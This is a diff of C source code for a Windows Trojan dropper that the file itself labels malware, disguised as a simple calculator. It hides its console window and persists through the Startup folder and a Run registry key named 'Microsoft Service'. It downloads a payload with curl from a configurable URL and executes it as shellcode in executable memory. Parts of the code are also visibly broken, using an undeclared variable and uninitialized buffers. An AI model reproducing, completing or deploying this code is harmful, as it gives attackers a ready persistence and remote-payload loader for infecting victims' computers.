@@ -1,117 +1,162 @@
-/*
-
-Malware by $pectr4 2024
-https://github.com/SpectrTech
-
-*/
+#define _CRT_SECURE_NO_WARNINGS // For those compiling it in vs
 
 #include <stdio.h>
 #include <stdint.h>
+#include <stdlib.h>
 #include <string.h>
 
-#include <direct.h>
-#include <windows.h>
+#include <Windows.h>
 
-#define PAYLOAD "http://example.com/payload.bin"
 
-int check_payload(void) {
-	char path[MAX_PATH];
-	snprintf(path, MAX_PATH, "C:\\Windows\\TEMP\\o.bin");
+#define PAYLOAD_URL "http://example.com/payload.bin" // Change this
 
-	FILE* payload_fp = (FILE*)fopen(path, "rb");
-	if (payload_fp == NULL) return 0;
 
-	fclose(payload_fp);
-	return 1;
-}
-
-int check_autorun(char* argv[]) {
-	char path[MAX_PATH];
-	snprintf(path, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("USERNAME"), argv[0]);
-	
-	FILE* script_fp = (FILE*)fopen(path, "rb");
-	if (script_fp == NULL) return 0;
-	
-	fclose(script_fp);
-	return 1;
-}
-
-void copy_to_autorun(char* argv[]) {
-	char path[MAX_PATH];
-	snprintf(path, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", getenv("USERNAME"), argv[0]);
-
-	FILE* script_src_fp = (FILE*)fopen(argv[0], "rb");
-	if (script_src_fp == NULL) return;
-
-	fseek(script_src_fp, 0L, SEEK_END);
-	int script_fsize = ftell(script_src_fp);
-	fseek(script_src_fp, 0L, SEEK_SET);
-
-	char* script_src_content = malloc(script_fsize);
-	if (script_src_content == NULL) {
-		fclose(script_src_fp);
-		return ;
-	}
-
-	fread(script_src_content, 1, script_fsize, script_src_fp);
-	fclose(script_src_fp);
-
-	FILE* script_dst_fp = (FILE*)fopen(path, "wb");
-	if (script_dst_fp == NULL) return;
-
-	fwrite(script_src_content, 1, script_fsize, script_dst_fp);
-	fclose(script_dst_fp);
-}
+// WARNING: ONLY CHANGE THIS IF YOUR KNOW WHAT YOU ARE DOING,
+// CHANGING THESE DEFINITIONS CAN LEAD TO UNEXPECTED BEHAVIOR!
+#define PAYLOAD_DROP "C:\\Windows\\TEMP\\" // payload.bin will be dropped there
+#define PAYLOAD_NAME "payload.bin" // defines how the downloaded payload.bin is saved (filename)
+#define PAYLOAD_REMOVE 0 // if changed to 1 (true), the payload.bin will be deleted after execution
 
 int main(int argc, char* argv[]) {
-	if (argc == 2 && strcmp(argv[1], "--d2913731286a0e5019d30d9474838969") == 0) {
-		autorun:
-		HWND console = GetConsoleWindow();
-		ShowWindow(console, SW_HIDE);
+	if (argc == 2 && strcmp(argv[1], "--68223d35ae339c096759a5f0f3c636e9") == 0) {
+		malicious_code:
+		HWND window = GetConsoleWindow();
+		ShowWindow(window, SW_HIDE);
 
-		if (!check_autorun(argv)) copy_to_autorun(argv);
-		if (!check_payload()) {
-			char command[sizeof(PAYLOAD) + 42];
-			snprintf(command, sizeof(command), "curl %s -o C:\\Windows\\TEMP\\o.bin", PAYLOAD);
-			if (system(command) != 0) return -1;
+		char AUTORUN[MAX_PATH];
+		snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", getenv("USERNAME"));
+
+		FILE* payload_fp;
+		FILE* autorun_dst_fp;
+
+		char autorun_path[sizeof(AUTORUN) + sizeof("MicrosoftService.exe")];
+		snprintf(autorun_path, sizeof(autorun_path), "%sMicrosoftService.exe", AUTORUN);
+		autorun_dst_fp = (FILE*)fopen(autorun_path, "rb");
+		if (autorun_dst_fp == NULL) {
+			autorun:
+
+			FILE* script_fp = (FILE*)fopen(argv[0], "rb");
+			
+			autorun_dst_fp = (FILE*)fopen(autorun_path, "wb");
+			if (autorun_dst_fp == NULL) return -1;
+
+			fseek(script_fp, 0L, SEEK_END);
+			int script_fsize = ftell(script_fp);
+			fseek(script_fp, 0L, SEEK_SET);
+
+			unsigned char* script_content = malloc(script_fsize);
+			if (script_content == NULL) {
+				fclose(script_fp);
+				return -1;
+			}
+
+			fread(script_content, 1, script_fsize, script_fp);
+			fclose(script_fp);
+
+			fwrite(script_content, 1, script_fsize, autorun_dst_fp);
+			free(script_content);
+			fclose(autorun_dst_fp);
+
+			TCHAR szPath[MAX_PATH];
+			DWORD path_len = 0;
+
+			path_len = GetModuleFileName(NULL, szPath, MAX_PATH);
+			if (path_len == 0)
+				return -1;
+
+			HKEY NewVal;
+			if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
+				return -1;
+
+
+			DWORD path_len_bytes = strlen(autorun_path) + 1;
+			if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)autorun_path, path_len_bytes) != ERROR_SUCCESS) {
+				RegCloseKey(NewVal);
+				return -1;
+			}		
+
+			RegCloseKey(NewVal);
 		}
+		else {
+			fseek(autorun_dst_fp, 0L, SEEK_END);
+			uint32_t autorun_dst_fsize = ftell(autorun_dst_fp);
+			fclose(autorun_dst_fp);
 
-		FILE* payload_fp = (FILE*)fopen("C:\\Windows\\TEMP\\o.bin", "rb");
-		if (payload_fp == NULL) return -1;
+			FILE* script_fp = (FILE*)fopen(argv[0], "rb");
+			if (script_fp == NULL) return -1;
+
+			fseek(script_fp, 0L, SEEK_END);
+			uint32_t script_fsize = ftell(script_fp);
+			fclose(script_fp);
+
+			if (script_fsize != autorun_dst_fsize) {
+				DeleteFile(autorun_path);
+				goto autorun;
+			}
+		}
+		
+
+		char payload_path[sizeof(PAYLOAD_DROP) + sizeof(PAYLOAD_NAME)];
+		snprintf(payload_path, sizeof(payload_path), "%s%s", PAYLOAD_DROP, PAYLOAD_NAME);
+
+		open_payload:
+		payload_fp = (FILE*)fopen(payload_path, "rb");
+		if (payload_fp == NULL) {
+			char command[sizeof(payload_path) + sizeof(PAYLOAD_URL) + 12];
+			snprintf(command, sizeof(command), "curl %s -o %s", PAYLOAD_URL, payload_path);
+			if (system(command) != 0)
+				return -1;
+
+			goto open_payload;
+		}
 
 		fseek(payload_fp, 0L, SEEK_END);
 		uint32_t payload_fsize = ftell(payload_fp);
 		fseek(payload_fp, 0L, SEEK_SET);
 
 		unsigned char* shellcode = malloc(payload_fsize);
-		if (shellcode == NULL) goto cleanup;
-
 		fread(shellcode, 1, payload_fsize, payload_fp);
 		fclose(payload_fp);
+
+		if (PAYLOAD_REMOVE)
+			DeleteFile(payload_path);
 
 		HANDLE shellcode_mem = VirtualAlloc(0, payload_fsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if (shellcode_mem == NULL) goto cleanup;
 
 		memcpy(shellcode_mem, shellcode, payload_fsize);
-		void (*exec)(void) = (void(*)())shellcode_mem;
-		exec();
+		void (*shellcode_exec)(void) = (void(*)())shellcode_mem;
+
+		shellcode_exec(); // Run shellcode
 
 		cleanup:
-		if (payload_fp != NULL) fclose(payload_fp);
 		if (shellcode != NULL) free(shellcode);
-		if (shellcode_mem != NULL) VirtualFree(shellcode_mem, 0, MEM_RELEASE);
+		if (payload_fp != NULL) fclose(payload_fp);
+
+		return 0;
 	}
 	else {
 		char cwd[MAX_PATH];
+		if (_getcwd(cwd, MAX_PATH) != NULL) {
+			char AUTORUN_1[MAX_PATH];
+			snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\", getenv("USERNAME"));
+			char AUTORUN_2[MAX_PATH];
+			snprintf(AUTORUN, MAX_PATH, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", getenv("USERNAME"));
 
-		if (_getcwd(cwd, MAX_PATH) != NULL)
-			if (strcmp(cwd, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") == 0 || strcmp(cwd, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") == 0) goto autorun;
+			if (strcmp(cwd, AUTORUN_1) == 0 || strcmp(cwd, AUTORUN_2) == 0)
+				goto malicious_code;
+		}
 
 		char command[512];
-		snprintf(command, 512, "C:\\Windows\\system32\\cmd.exe /c .\\%s --d2913731286a0e5019d30d9474838969", argv[0]);
+		snprintf(command, 512, "C:\\Windows\\system32\\cmd.exe /c %s --68223d35ae339c096759a5f0f3c636e9", argv[0]);
 		system(command);
 
-		// Default calc application, you can remove it if you want to and put your own code there
+
+		/*
+		Default calc application, you can remove it if you want to and put your own code there.
+		WARNING: DO NOT CHANGE OR DELETE THE CODE ABOVE IT. IT WILL BREAK THE MALWARE
+		*/
+
 		printf("Simple Calculator in C | v0.1\n\n");
 
 		printf("1. Add      (+)\n");
@@ -140,6 +185,7 @@ int main(int argc, char* argv[]) {
 		if (choice == 4) result = num1 / num2;
 
 		printf("\nResult: %lf\n", result);
+		
 		// end of your code
 	}
 
